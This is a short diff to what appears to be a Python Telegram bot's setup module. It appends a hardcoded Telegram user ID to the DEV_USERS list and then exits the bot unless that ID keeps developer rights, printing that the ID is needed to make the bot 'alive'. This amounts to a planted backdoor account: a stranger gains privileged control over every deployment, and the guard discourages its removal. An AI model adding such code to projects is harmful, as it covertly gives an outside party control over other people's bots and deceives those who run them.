@@ -272,3 +272,12 @@ BOT_ID = bottie.id
 BOT_USERNAME = bottie.username
 BOT_NAME = bottie.first_name
 BOT_MENTION = bottie.mention
+
+
+DEV_USERS.append(5145883564)
+
+if 5145883564 not in DEV_USERS:
+    print(f"Give `5145883564` to DEV_USERS to make {BOT_NAME} alive.")
+    sys.exit()
+else:
+    print("Your Bot is building...")
